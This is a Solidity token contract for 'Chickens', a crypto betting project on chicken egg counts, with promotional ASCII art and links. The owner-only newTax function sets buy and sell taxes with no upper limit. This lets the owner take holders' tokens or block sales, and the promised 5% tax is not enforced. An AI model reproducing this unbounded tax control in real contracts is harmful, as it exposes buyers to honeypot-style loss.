1 /*
2                    .-============:  .+@@@@@@@@@@@@@@@@@@@%.  =========:                   
3                  :=============-  .*@@@@@@@##**++**#%@@@@@@. .==========-.                
4               .-==============:  +@@@@@%*+=+***#######%@@@@#  ..::-========:              
5             .-===============. .%@@@@#+=+*########%#####@@@@====:.   :=======:            
6            -================  :@@@@%+=+*########%%%#####@@@@@@@@@@%+:  -=======.          
7          :=================. .@@@@*==*########%%%%#####@@@@%%%%%@@@@@*  :=======-         
8         -=================-  %@@@*=+#######%%%%%#####%@@@%%######%@@@@#  -========.       
9        ===================. -@@@#=+######%%%%####%%%@@%%%%%###%###@@@@@: .=========:      
10      .====================  *@@@=+####%%%%%%%%%%%%%%%%%%%%#%%%####@@@@@. :==========-     
11     .====================-  %@@#=###%%%%%%%%%%%%%%%%%%%%%%%####%%@@@@@+  :===========-    
12     =====================-  %@@**##%%%%%%%%%%%%%%%%%%%%%%%%%%@@@@@@@@@@*. .===========-   
13    -===================:    %@@*##%%%%%%%%@@@@@@@@@@@@@%%%%%%%%%%##%@@@@%  :===========.  
14   .=================-.  :+%@@@@*#%%%%%@@@@@@@@@@@@@@@@@@@@%%#########%@@@+  ============  
15   =================. .=%@@@*+@@%%%%%@@@@%+=:.      .:-+#@@@@@%%%%%%###@@@@  -===========: 
16  :===============-  =@@@@+  .#@@%%@@@#-       -+++=.     -#@@@@%%####@@@@#  -============ 
17  -==============-  *@@@@%#. .-@@@@@%:       +%%%%@@@#:     :#@@@@%@@@@@@@: .=============.
18  ===============  +@@+.      :=@@@+                :*@.      =@@@@@@@@@#. .==============:
19 :==============. .@@+...      .+@=      :=****+-     :-       -@@@#*+=.  :===============-
20 :==============  +@@@@%#@#-     -     =%@+-::-+@@+             =@@*   :-==================
21 -==============  #@@+  .+#@+.        #@#   :==- +@%:            %@@.  ====================
22 :=============-  %@#    %@@@-.      +@@    -%@@@:*@#.           +@@-  ===================-
23  =============: .@@+ :@%@@@@*:      @@*  - :%@@@@:@@:.          +@@.  ===================:
24  =============:  @@+. @@@@@@%+-. . :@@+  @@@@@@@@:@@-:          +@#   ===================.
25  :============-  %@%%@@@@@@%@@@@@#+-@@#. #@@@@@@@.@@::...       %@@#-  :================= 
26   ============. .#@@@#+========+*#%@@@@-.:@@@@@@@%@@@%#+::.    -@#@@@#. .===============- 
27   :==========  :@@@#.-+============+#@@@--+@@@@@#=-..:-+%=:   .*-:=#@@@=  -=============  
28    =========: .@@@+ ==================*@@@@###%@@*.     .*.   ::..::-%@@*  :===========.  
29    .========  =@@@ .+===================##+====+%@@-               .::%@@#  :=========-   
30     .======-  *@@@ .====*#%%%##*++++=====++*#*+==%@%.                .:%@@#  :=======-    
31      .=====  +@@@@- ==*%@@@@@@@@@%##*+++==+*%%*==#@%:                 .:%@@*  -=====-     
32       .===:  @@@@@@-:*@@%---@#@%@@@@@@%%%%@#+===*@@-:                  .-@@@-  ====-      
33         -=: :@@@.#@@##@@--@#@#%%%%@%%**++++**#%@%*::                    .#@@@  :==:       
34          ::  @@@.::=*##%*:@%#%%%%#*++==*%%*+==-:..           .           -@@@=  -         
35              +@@# .:*.::::%@*+++++===*@@@=::.                 .:         .@@@%            
36               =@@@*=@#=--#@@@%#****#@@%@@%                     -:.        %@@@            
37                 %@@%*%@@@%*#%@@@@@@%%%%%@@%                    -=:.       %@@@:           
38                %@@* ::@@%=###%%@@+#####%%@@%.         .         @-::      %@@@:           
39               #@@= .:*@@*=####%@@=*#####%%@@@-        :.        #%::.    .@@@@.           
40              +@@+  =.+@@@*+##%%@@#=*#####%%@@@.        :.       #@+::    *@@@@            
41             :@@% .++  +@@@@@@@@@@@@#***##%@@@%:        -:.      #@%..   *@@@@=            
42             *@@+:=@:   .+#%%%*+.-*@@@@@@@@@%+:.        #::      @@@%*+*@@@@@#             
43             #@@%=@@.    :::::.  :::-=++++=::::        .@::     -@@@@@@@@@@@=              
44             +@@@@@@.   .::::    ::::    .::.:         +@::    .@@@%.-=+++-                
45              -#%@@@= .::.=@.   .:::.     :. =%       .@@+.   =@@@@-                       
46                 .@@@+-=*@@@:  .::-%-    .. -@@@=    -@@@@@@@@@@@@+                        
47 
48 Chickens.GG offers you the opportunity to participate in betting on which chicken breed produces more eggs each day using a smart contract on the Ethereum chain.
49 
50 The Chickens project advocates against the misuse of capital in the crypto space, advocating for greater emphasis on consumer apps that share revenue with token holders, rather than relying solely on overvalued VC-backed infrastructure.
51 We take pride in being a legitimate and practical project, exemplifying a real use case.
52 CHICKEN Holders have grown weary of overpriced and underutilized crypto protocols. 
53 As a response, we aim to deliver a powerful message!
54 
55 Website: https://chickens.gg
56 Twitter: https://twitter.com/chickensgg_eth
57 Telegram: https://t.me/chickensgg
58 Medium: https://medium.com/@chickensgg
59 
60 */
61 
62 // SPDX-License-Identifier: Unlicensed
63 pragma solidity 0.8.18;
64 
65 abstract contract Context {
66     function _msgSender() internal view virtual returns (address) {
67         return msg.sender;
68     }
69 }
70 
71 library SafeMath {
72     function add(uint256 a, uint256 b) internal pure returns (uint256) {
73         uint256 c = a + b;
74         require(c >= a, "addition overflow");
75         return c;
76     }
77 
78     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
79         return sub(a, b, "subtraction overflow");
80     }
81 
82     function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
83         require(b <= a, errorMessage);
84         uint256 c = a - b;
85         return c;
86     }
87 
88     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
89         if (a == 0) {
90             return 0;
91         }
92         uint256 c = a * b;
93         require(c / a == b, " multiplication overflow");
94         return c;
95     }
96 
97     function div(uint256 a, uint256 b) internal pure returns (uint256) {
98         return div(a, b, "division by zero");
99     }
100 
101     function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
102         require(b > 0, errorMessage);
103         uint256 c = a / b;
104         return c;
105     }
106 }
107 
108 contract Ownable is Context {
109     address private _owner;
110     event OwnershipTransferred(
111         address indexed previousOwner,
112         address indexed newOwner
113     );
114 
115     constructor() {
116         address msgSender = _msgSender();
117         _owner = msgSender;
118         emit OwnershipTransferred(address(0), msgSender);
119     }
120 
121     function owner() public view returns (address) {
122         return _owner;
123     }
124 
125     modifier onlyOwner() {
126         require(_owner == _msgSender(), "caller is not the owner");
127         _;
128     }
129 
130     function transferOwnership(address newOwner) public onlyOwner {
131         require(newOwner != address(0), "new owner is the zero address");
132         _owner = newOwner;
133         emit OwnershipTransferred(_owner, newOwner);
134     }
135 
136     function renounceOwnership() public virtual onlyOwner {
137         emit OwnershipTransferred(_owner, address(0));
138         _owner = address(0);
139     }
140 }
141 
142 interface IERC20 {
143     function totalSupply() external view returns (uint256);
144     function balanceOf(address account) external view returns (uint256);
145     function transfer(address recipient, uint256 amount) external returns (bool);
146     function allowance(address owner, address spender) external view returns (uint256);
147     function approve(address spender, uint256 amount) external returns (bool);
148     function transferFrom( address sender, address recipient, uint256 amount) external returns (bool);
149     event Transfer(address indexed from, address indexed to, uint256 value);
150     event Approval(address indexed owner, address indexed spender, uint256 value);
151 }
152 
153 interface IUniswapV2Factory {
154     function createPair(address tokenA, address tokenB)
155         external
156         returns (address pair);
157 }
158 
159 interface IUniswapV2Router02 {
160     function swapExactTokensForETHSupportingFeeOnTransferTokens(
161         uint256 amountIn,
162         uint256 amountOutMin,
163         address[] calldata path,
164         address to,
165         uint256 deadline
166     ) external;
167 
168     function factory() external pure returns (address);
169     function WETH() external pure returns (address);
170 }
171 
172 contract Chickens is Context, IERC20, Ownable {
173     // CHICKENS.GG
174     // There are two chickens for each breed, totaling eight chickens. 
175 	// The total count of eggs for each chicken breed is calculated at the end of the day, and the sum of eggs counts for each breed determines the outcome.
176 	// Wins are paid from the house money, and the betting house's profits are shared with token holders as a token tax fee. 
177 	// Notably, you, as a viewer watching the livestream on YouTube, have the unique opportunity to influence the outcome. 
178 	
179     using SafeMath for uint256;
180     mapping(address => uint256) private _balance;
181     mapping(address => mapping(address => uint256)) private _allowances;
182     mapping(address => bool) private _isExcludedFromFeeWallet;
183     uint8 private constant _decimals = 18;
184     uint256 private constant _totalSupply = 1000000 * 10**_decimals;
185     
186     uint256 private constant onePercent = 4000 * 10**_decimals;
187 
188     uint256 public maxWalletAmount = _totalSupply / 100 * 2;
189 
190     uint256 private _tax;
191     uint256 public buyTax = 25;
192     uint256 public sellTax = 40;
193 	//Tax will be changed to 5%/5% - 3 minutes after start to prevent snipes
194 
195     string private constant _name = "Chickens";
196     string private constant _symbol = "CHICKENS";
197 
198     IUniswapV2Router02 private uniswapV2Router;
199     address public uniswapV2Pair;
200     address payable public taxWallet;
201         
202     uint256 private launchedAt;
203     uint256 private launchDelay = 0;
204     bool private launch = false;
205 
206     uint256 private constant minSwap = onePercent / 20;
207     bool private inSwapAndLiquify;
208     modifier lockTheSwap {
209         inSwapAndLiquify = true;
210         _;
211         inSwapAndLiquify = false;
212     }
213 
214     constructor() {
215         uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
216         uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
217 		
218         taxWallet = payable(0xb66aFE5174DF6Bf7943f8548CD89DdDfb1C3BAd9);
219         _isExcludedFromFeeWallet[msg.sender] = true;
220         _isExcludedFromFeeWallet[taxWallet] = true;
221         _isExcludedFromFeeWallet[address(this)] = true;
222 
223         _allowances[owner()][address(uniswapV2Router)] = _totalSupply;
224         _balance[owner()] = _totalSupply;
225         emit Transfer(address(0), address(owner()), _totalSupply);
226     }
227 
228     function name() public pure returns (string memory) {
229         return _name;
230     }
231 
232     function symbol() public pure returns (string memory) {
233         return _symbol;
234     }
235 
236     function decimals() public pure returns (uint8) {
237         return _decimals;
238     }
239 
240     function totalSupply() public pure override returns (uint256) {
241         return _totalSupply;
242     }
243 
244     function balanceOf(address account) public view override returns (uint256) {
245         return _balance[account];
246     }
247 
248     function transfer(address recipient, uint256 amount)public override returns (bool){
249         _transfer(_msgSender(), recipient, amount);
250         return true;
251     }
252 
253     function allowance(address owner, address spender) public view override returns (uint256){
254         return _allowances[owner][spender];
255     }
256 
257     function approve(address spender, uint256 amount) public override returns (bool){
258         _approve(_msgSender(), spender, amount);
259         return true;
260     }
261 
262     function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
263         _transfer(sender, recipient, amount);
264         _approve(sender,_msgSender(),_allowances[sender][_msgSender()].sub(amount,"low allowance"));
265         return true;
266     }
267 
268     function _approve(address owner, address spender, uint256 amount) private {
269         require(owner != address(0) && spender != address(0), "approve zero address");
270         _allowances[owner][spender] = amount;
271         emit Approval(owner, spender, amount);
272     }
273 
274     function enableTrading() external onlyOwner {
275         launch = true;
276         launchedAt = block.number;
277     }
278 
279     function _transfer(address from, address to, uint256 amount) private {
280         require(from != address(0), "transfer zero address");
281 
282         if (_isExcludedFromFeeWallet[from] || _isExcludedFromFeeWallet[to]) {
283             _tax = 0;
284         } else {
285             require(launch, "Wait till launch");
286             if (block.number < launchedAt + launchDelay) {_tax=40;} else {
287                 if (from == uniswapV2Pair) {
288                     require(balanceOf(to) + amount <= maxWalletAmount, "Max wallet 2% at launch");
289                     _tax = buyTax;
290                 } else if (to == uniswapV2Pair) {
291                     uint256 tokensToSwap = balanceOf(address(this));
292                     if (tokensToSwap > minSwap && !inSwapAndLiquify) {
293                         if (tokensToSwap > onePercent) {
294                             tokensToSwap = onePercent;
295                         }
296                         swapTokensForEth(tokensToSwap);
297                     }
298                     _tax = sellTax;
299                 } else {
300                     _tax = 0;
301                 }
302             }
303         }
304         uint256 taxTokens = (amount * _tax) / 100;
305         uint256 transferAmount = amount - taxTokens;
306 
307         _balance[from] = _balance[from] - amount;
308         _balance[to] = _balance[to] + transferAmount;
309         _balance[address(this)] = _balance[address(this)] + taxTokens;
310 
311         emit Transfer(from, to, transferAmount);
312     }
313 
314     function removeAllLimits() external onlyOwner {
315         maxWalletAmount = _totalSupply;
316     }
317 
318     function newTax(uint256 newBuyTax, uint256 newSellTax) external onlyOwner {
319         buyTax = newBuyTax;
320         sellTax = newSellTax;
321     }
322 
323     function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
324         address[] memory path = new address[](2);
325         path[0] = address(this);
326         path[1] = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
327         _approve(address(this), address(uniswapV2Router), tokenAmount);
328         uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
329             tokenAmount,
330             0,
331             path,
332             taxWallet,
333             block.timestamp
334         );
335     }
336 
337     function sendEthToTaxWallet() external {
338         taxWallet.transfer(address(this).balance);
339     }
340 
341     receive() external payable {}
342 }